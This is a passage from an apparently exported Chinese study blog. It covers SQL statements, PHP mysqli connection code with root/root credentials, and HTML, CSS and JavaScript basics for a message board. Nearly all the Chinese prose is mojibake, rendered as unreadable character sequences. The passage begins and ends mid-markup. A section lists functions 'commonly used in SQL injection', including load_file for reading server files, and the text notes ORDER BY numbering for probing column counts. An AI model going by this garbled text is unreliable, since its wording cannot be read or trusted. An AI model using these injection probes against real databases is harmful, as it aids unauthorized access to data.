class="comment">/*æ²¡æœ‰æ˜ç¡®æ’å®šçš„é¡ºåºï¼Œæ¯ä¸€æ¬¡æŸ¥è¯¢çš„é¡ºåºå¯èƒ½éƒ½ä¸ä¸€æ ·ï¼Œå¾ˆæ­£å¸¸ï¼Œç‰µæ‰¯åˆ°DBMSçš„å›æ”¶æœºåˆ¶ï¼Œçœ‹çœ‹ä¹¦å°±å¥½ï¼Œä¸å¤šè¯´*/</span></span><br></pre></td></tr></table></figure><h4 id="3-10-whereå¥å­"><a href="#3-10-whereå¥å­" class="headerlink" title="3.10 whereå¥å­"></a>3.10 whereå¥å­</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ä½ è¦çš„ä¿¡æ¯ <span class="keyword">from</span> æ•°æ®è¡¨(æˆ–å¤šä¸ª) <span class="keyword">where</span> æ»¡è¶³çš„æ¡ä»¶(åˆ¤æ–­çš„æ¡ä»¶)</span><br></pre></td></tr></table></figure><p>â€œ*â€ä»£è¡¨æ‰€æœ‰ç¬¦åˆæ•°æ®ï¼Œwhereä¹Ÿå¯ä»¥ç”¨äºupdateæˆ–è€…deleteè¯­å¥ä¸­</p><h4 id="3-11-order-byå¥å­"><a href="#3-11-order-byå¥å­" class="headerlink" title="3.11 order byå¥å­"></a>3.11 order byå¥å­</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ä½ è¦çš„ä¿¡æ¯ <span class="keyword">from</span> æ•°æ®è¡¨(æˆ–å¤šä¸ª) <span class="keyword">order</span> <span class="keyword">by</span> å­—æ®µ <span class="keyword">ASC</span>/<span class="keyword">DESC</span>   <span class="comment">/*æŒ‰å­—æ¯ç­‰é¡ºåºæ’åºï¼Œåé¢çš„ASCé‚£äº›å¯ä»¥ä¸å†™ï¼Œé»˜è®¤ASCå‡åºï¼ŒDESCé™åº*/</span></span><br></pre></td></tr></table></figure><p>å¯ä½¿ç”¨order by â€˜æ•°å­—â€™ï¼Œåˆ¤æ–­æ•°æ®æ ‡çš„å­—æ®µé•¿åº¦</p><p>ä½¿ç”¨è¯¥å­å¥æ—¶ï¼Œåº”ç¡®ä¿ä»–æ˜¯selectè¯­å¥çš„æœ€åä¸€ä¸ªå­—å¥ï¼Œå³å½“whereå­å¥å‡ºç°çš„æ—¶å€™order byåº”è¯¥æ”¾åœ¨whereçš„åé¢ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p>æŒ‰å¤šä¸ªåˆ—æ’åºï¼Œåƒæœç´¢çš„æ—¶å€™ç”¨é€—å·éš”å¼€å³å¯ï¼Œå¦‚ï¼š<code>select userï¼Œcontent from msg order by user,content;</code>è¿™å¥è¯åªæœ‰åœ¨userè¿™ä¸ªæ¡ä»¶éƒ½ä¸€æ ·çš„æ—¶å€™æ‰ä¼šå¯¹contentæ’åºï¼Œå¦‚æœuseréƒ½æ˜¯å”¯ä¸€çš„è¯ï¼Œæ²¡å•¥å®é™…ä½œç”¨ã€‚ã€‚ã€‚ã€‚</p><h4 id="3-12-unionå¥å­"><a href="#3-12-unionå¥å­" class="headerlink" title="3.12 unionå¥å­"></a>3.12 unionå¥å­</h4><p>å¯ä»¥åˆå¹¶ä¸¤ä¸ªè¡¨ä¸­çš„ä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ä½ è¦çš„ä¿¡æ¯ <span class="keyword">from</span> æ•°æ®è¡¨<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> ä½ è¦çš„ä¿¡æ¯ <span class="keyword">from</span> æ•°æ®è¡¨<span class="number">2</span>;  <span class="comment">/*å¯¹äºè¿™å¥è¯ï¼Œå®ƒæ˜¯ä¸æ˜¾ç¤ºä¸¤ä¸ªè¡¨ä¸­çš„ç›¸åŒçš„ä¿¡æ¯çš„*/</span></span><br></pre></td></tr></table></figure><p>è¦æ˜¾ç¤ºå…¨éƒ¨ä¿¡æ¯çš„è¯å¯ä»¥ä½¿ç”¨union all,å¯¹äºé‚£ä¸€ç§ï¼Œå…¶å®è¿˜æœ‰ä¸ªdistinctå…³é”®å­—è®©æ•°æ®åº“åªè¿”å›ä¸åŒçš„å€¼ï¼Œä¸å¤šè¯´ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ä¹¦å­¦ä¹ </p><h4 id="3-13-limitå¥å­"><a href="#3-13-limitå¥å­" class="headerlink" title="3.13 limitå¥å­"></a>3.13 limitå¥å­</h4><p>limitæŒ‡å®šè¿”å›çš„è¡Œæ•°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> teacher <span class="keyword">limit</span> <span class="number">5</span> <span class="keyword">offset</span> <span class="number">5</span>;  //è¿™é‡Œçš„offsetæ˜¯ä»ç¬¬å‡ è¡Œå¼€å§‹ï¼Œè¿™å¥è¯æ˜¯ä»ç¬¬äº”è¡Œèµ·çš„äº”è¡Œæ•°æ®</span><br></pre></td></tr></table></figure><p><code>æ³¨æ„ï¼š</code>ç¬¬0è¡Œçš„é—®é¢˜<br><code>limit 1 offset 1</code> æ˜¯ä»æ•°æ®è¡¨çš„çš„ç¬¬äºŒè¡Œå¼€å§‹ï¼Œå› ä¸ºæ•°æ®åº“ç¬¬ä¸€è¡Œç›¸å½“äºè¯­å¥çš„ç¬¬0è¡Œ</p><h4 id="3-14-æ›´æ–°æ•°æ®"><a href="#3-14-æ›´æ–°æ•°æ®" class="headerlink" title="3.14 æ›´æ–°æ•°æ®"></a>3.14 æ›´æ–°æ•°æ®</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> teacher <span class="keyword">set</span> <span class="keyword">name</span> = <span class="string">'0ver'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="3-15-åˆ é™¤è¡¨çš„å†…å®¹"><a href="#3-15-åˆ é™¤è¡¨çš„å†…å®¹" class="headerlink" title="3.15 åˆ é™¤è¡¨çš„å†…å®¹"></a>3.15 åˆ é™¤è¡¨çš„å†…å®¹</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure><h4 id="3-16-åˆ é™¤è¡¨"><a href="#3-16-åˆ é™¤è¡¨" class="headerlink" title="3.16 åˆ é™¤è¡¨"></a>3.16 åˆ é™¤è¡¨</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> è¡¨å</span><br></pre></td></tr></table></figure><h4 id="3-17-sqlæ³¨å…¥ä¸­å¸¸ç”¨çš„å†…ç½®å‡½æ•°"><a href="#3-17-sqlæ³¨å…¥ä¸­å¸¸ç”¨çš„å†…ç½®å‡½æ•°" class="headerlink" title="3.17 sqlæ³¨å…¥ä¸­å¸¸ç”¨çš„å†…ç½®å‡½æ•°"></a>3.17 sqlæ³¨å…¥ä¸­å¸¸ç”¨çš„å†…ç½®å‡½æ•°</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()</span><br><span class="line"><span class="keyword">select</span> currebt_user</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"è·¯å¾„"</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>()     //æ•°æ®åº“ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><h4 id="3-18-phpè¿æ¥åˆ°æ•°æ®åº“"><a href="#3-18-phpè¿æ¥åˆ°æ•°æ®åº“" class="headerlink" title="3.18 phpè¿æ¥åˆ°æ•°æ®åº“"></a>3.18 phpè¿æ¥åˆ°æ•°æ®åº“</h4><p>å‰ä¸¤å¤©æ€»ç»“äº†phpï¼Œç°åœ¨å†æ¥è®²è®²php+mysqlçš„åº”ç”¨</p><p>æˆ‘è®¤ä¸ºï¼Œè¿™ä¸ªä»£ç åº”è¯¥åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><p>1.è¿æ¥åˆ°æ•°æ®åº“<br>2.æ‰§è¡ŒSQLè¯­å¥</p><p>æé†’ä¸€ä¸‹ï¼Œä¸è¦ç”¨mysql_connectè¿æ¥äº†ï¼Œå¤ªå¤è€äº†ï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯è¿™æ ·è¯´çš„ï¼šä» PHP 5.5.0 èµ·è¿™ä¸ªæ‰©å±•å·²ç»è¢«åºŸå¼ƒï¼Œå¹¶ä¸”ä» PHP 7.0.0. å¼€å§‹è¢«ç§»é™¤ã€‚<br>æ€ªä¸å¾—æˆ‘ä»¥å‰ç…§ç€ä¹¦ä¸Šçš„ä»£ç æ•²çš„æ—¶å€™ä¸èƒ½ç”¨ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>mysqliè¿æ¥ï¼Œè¿™ä¸ªå¤§éƒ¨åˆ†æ˜¯é¢å‘å¯¹è±¡çš„ï¼Œå³æœ€å¥½ç”¨newæ¥å¼€å§‹è¿æ¥ï¼Œä¸æ¨èè¿‡ç¨‹åŒ–é£æ ¼ï¼Œè™½ç„¶è¿‡ç¨‹åŒ–é£æ ¼è·Ÿmysql_connectå¾ˆåƒï¼Œæ‰€ä»¥è¿˜æ˜¯å¯¹phpé‡Œé¢çš„ç±»å’Œå¯¹è±¡æœ‰ç‚¹äº†è§£æ¯”è¾ƒå¥½,æƒ³è¯¦ç»†äº†è§£çš„è¯å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£</p><p>å¦å¤–æ‰§è¡Œmysqlè¯­å¥å‘½ä»¤ç”¨çš„æ˜¯queryè¯­å¥æ‰§è¡Œçš„,è€Œä¸”queryè¯­å¥è¿”å›çš„æ˜¯trueè·Ÿfalseï¼Œå¯ä»¥ç”¨è¿™ä¸€ç‚¹å»åˆ¤æ–­æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚</p><p>æ•´ä¸ªç¯å¢ƒéƒ½æ˜¯ç”¨PHPstudyæ­çš„ï¼Œæ•°æ®åº“åç§°æ˜¯php10ï¼Œä»¥åé…ç½®è®°å¾—ä»¥ä¸‹ä¸‰æ­¥ï¼šæ•°æ®åº“å¯¼å…¥ï¼ŒåŸç å¯¼å…¥ï¼Œé…ç½®æ•°æ®åº“æ–‡ä»¶emmmmï¼Œä¸å¤šè¯´äº†ï¼Œè¿˜æ˜¯ç›´æ¥ä¸Šä»£ç æ¯”è¾ƒé è°±ï¼š  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;</span><br><span class="line">$user = <span class="string">'root'</span>;</span><br><span class="line">$pwd = <span class="string">'root'</span>;</span><br><span class="line">$dbname = <span class="string">'php10'</span>;</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> mysqli($host,$user,$pwd,$dbname);</span><br><span class="line"><span class="keyword">if</span>($db-&gt;connect_errno!=<span class="number">0</span>)   <span class="comment">//è¿™é‡Œçš„çš„mysqli_errno=0å³è¿æ¥æˆåŠŸï¼Œå¯ä»¥ç”¨var_dumpå‡½æ•°å»éªŒè¯</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"è¿æ¥å¤±è´¥ï¼"</span>;</span><br><span class="line"><span class="keyword">echo</span> $db-&gt;connect_error;    <span class="comment">//è¿”å›é”™è¯¯ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"update msg set user='0verWatch' where id=1"</span>;  <span class="comment">//sqlè¯­è¨€ä¸åˆ†å¤§å°å†™</span></span><br><span class="line">$db-&gt;query(<span class="string">"SET NAMES UTF8"</span>); </span><br><span class="line">    <span class="comment">//ç¡®ä¿æ•°æ®ä¼ è¾“ä¹Ÿæ˜¯UTF-8ï¼Œé˜²æ­¢å‡ºç°ä¹±ç ï¼Œå¯èƒ½ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œä½†æˆ‘å‘ç°æˆ‘åˆ é™¤ä¹‹åæ²¡å½±å“ï¼Œæœ€å¥½è¿˜æ˜¯äº›å†™å†™å§ï¼Œå°å¿ƒæ˜¯UTF8æ²¡æœ‰æ¨ªçº¿</span></span><br><span class="line">$flag = $db-&gt;query($sql);      <span class="comment">//è¿”å›trueè·Ÿfalseï¼ŒæŸ¥è¯¢å®˜æ–¹æ–‡æ¡£å¯çŸ¥</span></span><br><span class="line"><span class="keyword">if</span>($flag == <span class="keyword">true</span>)    </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'è¿æ¥æˆåŠŸï¼'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"è¿æ¥å¤±è´¥"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-å‘å‡ å¥ç‰¢éªš"><a href="#0x03-å‘å‡ å¥ç‰¢éªš" class="headerlink" title="0x03  å‘å‡ å¥ç‰¢éªš"></a>0x03  å‘å‡ å¥ç‰¢éªš</h2><p> æ”¾å¯’å‡æ‰“çš„ç¬¬ä¸€åœºçƒï¼Œå°±æŠŠæ‰‹ç»™æŠ˜äº†ï¼Œè¿˜å¥½æˆ‘å¼ºå¿ç€ç–¼ç—›æŠŠè¿™ç¯‡åšå®¢ç»™å†™å®Œï¼Œæœç„¶å­¦ä¹ æ‰æ˜¯äººç”Ÿç¬¬ä¸€å¤§äº‹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚    </p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpç•™è¨€æ¿ç¼–å†™æ€»ç»“</title>
      <link href="/php%20summary.html"/>
      <url>/php%20summary.html</url>
      <content type="html"><![CDATA[<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01  å‰è¨€"></a>0x01  å‰è¨€</h2><p>   å¯’å‡é—²æ¥æ— äº‹ï¼Œå°±éšä¾¿å†™ä¸€ä¸ªç•™è¨€æ¿æ¥å¤ä¹ ä¸€ä¸‹phpè¯­è¨€  </p><a id="more"></a><h2 id="0x02-å…ˆä»htmlè¯­è¨€ç®€å•è¯´èµ·"><a href="#0x02-å…ˆä»htmlè¯­è¨€ç®€å•è¯´èµ·" class="headerlink" title="0x02  å…ˆä»htmlè¯­è¨€ç®€å•è¯´èµ·"></a>0x02  å…ˆä»htmlè¯­è¨€ç®€å•è¯´èµ·</h2><h4 id="åŸºç¡€çš„htmlç»“æ„ï¼š"><a href="#åŸºç¡€çš„htmlç»“æ„ï¼š" class="headerlink" title="åŸºç¡€çš„htmlç»“æ„ï¼š"></a>åŸºç¡€çš„htmlç»“æ„ï¼š</h4>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>     //å£°æ˜</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  //æè¿°ç½‘é¡µå„ç§å±æ€§ï¼Œä¸€èˆ¬ä¸åœ¨ç½‘é¡µå†…å®¹å†…æ˜¾ç¤º</span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  //çœŸæ­£å†™å†…å®¹çš„</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>//å¤§æ ‡ç­¾</span><br></pre></td></tr></table></figure><h4 id="ç”¨åˆ°çš„æ ‡ç­¾"><a href="#ç”¨åˆ°çš„æ ‡ç­¾" class="headerlink" title="ç”¨åˆ°çš„æ ‡ç­¾:"></a>ç”¨åˆ°çš„æ ‡ç­¾:</h4><ol><li>ä¸€å¯¹çš„ï¼š</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  //å®¹å™¨</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>    //è¡¨æ ¼</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>  //æ–‡æœ¬è¾“å…¥</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span>=<span class="string">""</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span>  //è¶…é“¾æ¥</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span>     //é€‰æ‹©é¡¹</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>    //é€‰æ‹©å†…å®¹</span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>å•èº«ç‹—ç±»å‹çš„:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span>  //è¾“å…¥  typeè·Ÿvalueå±æ€§åˆ†åˆ«æ˜¯è¾“å…¥çš„ç±»å‹è·Ÿåå­—  </span><br><span class="line">                            //typeæœ‰submitï¼Œtextï¼Œradioï¼Œcheckboxï¼Œfileç­‰å±æ€§</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span>           //æ³¨é‡Š  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">""</span>  <span class="attr">width</span>=<span class="string">""</span> <span class="attr">height</span> =<span class="string">""</span>/&gt;</span>       //å›¾ç‰‡</span><br></pre></td></tr></table></figure></li></ol><h4 id="å…¨å±€å±æ€§"><a href="#å…¨å±€å±æ€§" class="headerlink" title="å…¨å±€å±æ€§"></a>å…¨å±€å±æ€§</h4><p> ä¾‹å¦‚id class title nameç­‰</p><h2 id="0x03-CSS"><a href="#0x03-CSS" class="headerlink" title="0x03 CSS"></a>0x03 CSS</h2><p>   æ„Ÿè§‰è¿™ä¸€éƒ¨åˆ†æ²¡ä»€ä¹ˆå¤šå¤§ä½œç”¨ï¼Œå› ä¸ºå•å•æ˜¯ç”¨æ¥ç¾åŒ–çš„ï¼ˆæˆ‘æ„Ÿè§‰ï¼‰ï¼Œè€ƒè™‘åˆ°è‡ªå·±åˆšå†™åšå®¢è¿˜æ˜¯æ€»ç»“ä¸€ä¸‹æˆ‘è‡ªå·±è®¤ä¸ºçš„ä¸œè¥¿å§ã€‚<br>    <strong>æ ·å¼</strong>ï¼šè®¾ç½®å­—ä½“é¢œè‰²å®½åº¦èƒŒæ™¯é¢œè‰²ç­‰å°±æ˜¯æ ·å¼  æ ·å¼ä¸æ ·å¼ä¹‹é—´ç”¨<strong>åˆ†å·</strong>éš”å¼€ï¼Œå…¶å±æ€§ç”¨<strong>å†’å·</strong>éš”å¼€ã€‚ã€‚</p><h4 id="å¯¹CSSçš„æ“ä½œ"><a href="#å¯¹CSSçš„æ“ä½œ" class="headerlink" title="å¯¹CSSçš„æ“ä½œ"></a>å¯¹CSSçš„æ“ä½œ</h4><p>1.åˆ©ç”¨divæ ‡ç­¾é‡Œé¢çš„styleå±æ€§å»å®Œæˆæ“ä½œï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:red;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   2.åœ¨headé‡Œé¢å†™ï¼Œé€šè¿‡styleæ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">    //divé‡Œé¢çš„å†…å®¹éƒ½å˜æˆçº¢è‰²</span></span><br><span class="line"><span class="undefined">div&#123;</span></span><br><span class="line"><span class="undefined">color:green;</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>3.é€šè¿‡å¤–é“¾å»å®ç°ï¼Œå†™linkæ ‡ç­¾åœ¨headé‡Œé¢ï¼Œæ³¨æ„æ­¤æ—¶ä¸èƒ½ä½¿ç”¨styleæ ‡ç­¾ï¼Œå› ä¸ºstyleæ ‡ç­¾æ˜¯å±äºhtmlçš„ä¸œè¥¿</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>  <span class="attr">type</span> = <span class="string">"text/css"</span>  <span class="attr">href</span>= <span class="string">"style.css"</span>/&gt;</span>  //æœ€åä¸€ä¸ªå±æ€§æ˜¯ä½ å¯¹åº”çš„æ–‡ä»¶å</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="é€‰æ‹©å™¨"><a href="#é€‰æ‹©å™¨" class="headerlink" title="é€‰æ‹©å™¨:"></a>é€‰æ‹©å™¨:</h4><p><code>&lt;div&gt;&lt;/div&gt;</code>  cssæ–‡ä»¶å†…éƒ½æ˜¯å¦‚æœæ˜¯divå°±ä»£è¡¨å…¨éƒ¨divéƒ½æ”¹å˜å­—ä½“å¤§å°ç­‰å±æ€§ã€‚ã€‚ã€‚</p><p> å…³äºé€‰ä¸­æŸä¸€éƒ¨åˆ†çš„å®¹å™¨å»æ”¹å­—ä½“å¤§å°æˆ–é¢œè‰²<br>ä¾‹å¦‚:<br><code>&lt;div id=&quot;a1&quot;&gt;&lt;/div&gt;</code>,å¯¹åº”çš„cssæ–‡ä»¶ä¹Ÿè¦æ”¹ï¼Œæ”¹æˆ<code>#a1{}</code> è¿™é‡Œçš„#ä»£è¡¨äº†æ˜¯<strong>idé€‰æ‹©å™¨</strong><br><code>&lt;div class=&quot;a1&quot;&gt;&lt;/div&gt;</code>,å¯¹åº”çš„cssæ–‡ä»¶ä¹Ÿè¦æ”¹ï¼Œæ”¹æˆ<code>.a1{}</code> è¿™é‡Œçš„#ä»£è¡¨äº†æ˜¯<strong>ç±»é€‰æ‹©å™¨</strong><br>  è¿˜æœ‰å°±æ˜¯æœ‰ä¸€ä¸ªç±»ä¼¼C++é‡Œé¢çš„ç»§æ‰¿å…³ç³»çš„ä¸œè¥¿ï¼Œåœ¨åŒåä¸åŒé€‰æ‹©å™¨å†…å¯ä»¥åœ¨cssæ–‡ä»¶å†…è¿™æ ·å†™ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#a1 .aa1</span><br><span class="line">&#123;</span><br><span class="line">&#125;  //idé€‰æ‹©å™¨çš„</span><br><span class="line">.a1 .aa1</span><br><span class="line">&#123;</span><br><span class="line">&#125;  //ç±»é€‰æ‹©å™¨çš„</span><br></pre></td></tr></table></figure><h2 id="0x04-å†æ¥ç®€å•è°ˆè°ˆJavaScript"><a href="#0x04-å†æ¥ç®€å•è°ˆè°ˆJavaScript" class="headerlink" title="0x04  å†æ¥ç®€å•è°ˆè°ˆJavaScript"></a>0x04  å†æ¥ç®€å•è°ˆè°ˆJavaScript</h2><p>ä¸€èˆ¬ç½‘é¡µä¸Šçš„åŠ¨æ€ç”»é¢éƒ½æ˜¯å®ƒæ¥å®Œæˆçš„</p><h4 id="å¯ä»¥è¿è¡Œçš„åœ°æ–¹"><a href="#å¯ä»¥è¿è¡Œçš„åœ°æ–¹" class="headerlink" title="å¯ä»¥è¿è¡Œçš„åœ°æ–¹"></a>å¯ä»¥è¿è¡Œçš„åœ°æ–¹</h4><ol><li>htmlçš„<code>&lt;script&gt;&lt;/script&gt;</code></li><li>htmlå±æ€§äº‹ä»¶ä¸­ï¼Œå¦‚<strong>onclick</strong></li><li>æµè§ˆå™¨çš„<strong>consoleæ§åˆ¶å°</strong>     //ctfé¢˜ç›®æœ‰äº›å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹å»æ‰¾flag</li></ol><h4 id="JavaScript-DOM-ä¸»è¦æ˜¯å¯¹htmlçš„æ“ä½œ"><a href="#JavaScript-DOM-ä¸»è¦æ˜¯å¯¹htmlçš„æ“ä½œ" class="headerlink" title="JavaScript DOM   ä¸»è¦æ˜¯å¯¹htmlçš„æ“ä½œ"></a>JavaScript DOM   ä¸»è¦æ˜¯å¯¹htmlçš„æ“ä½œ</h4><p>1.è·å–htmlå…ƒç´   å‡½æ•°<strong>getElementById():</strong>é€šè¿‡IDè·å–å…ƒç´ ,ä¾‹å¦‚ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"info"</span>&gt;</span>å“ˆå“ˆå“ˆ<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">x= doucument.getElementById(<span class="string">"info"</span>)</span></span><br><span class="line"><span class="javascript">alert(<span class="string">'idä¸ºinfoå…ƒç´ çš„æ–‡æœ¬æ˜¯'</span>+x.innerHTML);    <span class="comment">//è¿™é‡Œçš„innerHTMLæ˜¯è·å–å…ƒç´ å†…å®¹ï¼Œè€Œalert()åœ¨JavaScriptä¸­å¯ä»¥å¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†å±•ç¤ºä¿¡æ¯</span></span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>   2.ä¿®æ”¹htmlå†…å®¹ ä¸è·å–å†…å®¹çš„å‰ä¸¤æ­¥æ˜¯ä¸€æ ·çš„ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"info"</span>&gt;</span>å“ˆå“ˆå“ˆ<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span 